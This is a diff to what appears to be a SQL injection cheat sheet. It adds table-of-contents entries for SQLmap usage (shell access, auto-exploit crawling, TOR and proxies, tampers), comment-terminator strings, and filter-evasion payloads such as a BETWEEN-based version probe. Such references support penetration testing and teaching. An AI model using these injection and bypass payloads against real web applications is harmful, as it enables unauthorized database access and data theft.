@@ -19,6 +19,17 @@ Attempting to manipulate SQL queries may have goals including:
 * [Entry point detection](#entry-point-detection)
 * [DBMS Identification](#dbms-identification)
 * [SQL injection using SQLmap](#sql-injection-using-sqlmap)
+  * [Basic arguments for SQLmap](#basic-arguments-for-sqlmap)
+  * [Load a request file and use mobile user-agent](#load-a-request-file-and-use-mobile-user-agent)
+  * [Custom injection in UserAgent/Header/Referer/Cookie](#custom-injection-in-useragentheaderreferercookie)
+  * [Second order injection](#second-order-injection)
+  * [Shell](#shell)
+  * [Crawl a website with SQLmap and auto-exploit](#crawl-a-website-with-sqlmap-and-auto-exploit)
+  * [Using TOR with SQLmap](#using-tor-with-sqlmap)
+  * [Using a proxy with SQLmap](#using-a-proxy-with-sqlmap)
+  * [Using Chrome cookie and a Proxy](#using-chrome-cookie-and-a-proxy)
+  * [Using suffix to tamper the injection](#using-suffix-to-tamper-the-injection)
+  * [General tamper option and tamper's list](#general-tamper-option-and-tampers-list)
 * [Authentication bypass](#authentication-bypass)
 * [Polyglot injection](#polyglot-injection-multicontext)
 * [Routed injection](#routed-injection)
@@ -41,6 +52,7 @@ Simple characters
 %3B
 )
 Wildcard (*)
+&apos;  # required for XML content
 ```
 
 Multiple encoding
@@ -276,6 +288,9 @@ tamper=name_of_the_tamper
 "&"
 "^"
 "*"
+'--'
+"--"
+'--' / "--"
 " or ""-"
 " or "" "
 " or ""&"
@@ -428,12 +443,13 @@ SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
 SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
 ```
 
-No Equal - bypass using LIKE/NOT IN/IN
+No Equal - bypass using LIKE/NOT IN/IN/BETWEEN
 
 ```sql
 ?id=1 and substring(version(),1,1)like(5)
 ?id=1 and substring(version(),1,1)not in(4,3)
 ?id=1 and substring(version(),1,1)in(4,3)
+?id=1 and substring(version(),1,1) between 3 and 4
 ```
 
 Blacklist using keywords - bypass using uppercase/lowercase
@@ -449,7 +465,7 @@ Blacklist using keywords case insensitive - bypass using an equivalent operator
 ```sql
 AND   -> &&
 OR    -> ||
-=     -> LIKE,REGEXP, not < and not >
+=     -> LIKE,REGEXP, BETWEEN, not < and not >
 > X   -> not between 0 and X
 WHERE -> HAVING
 ```
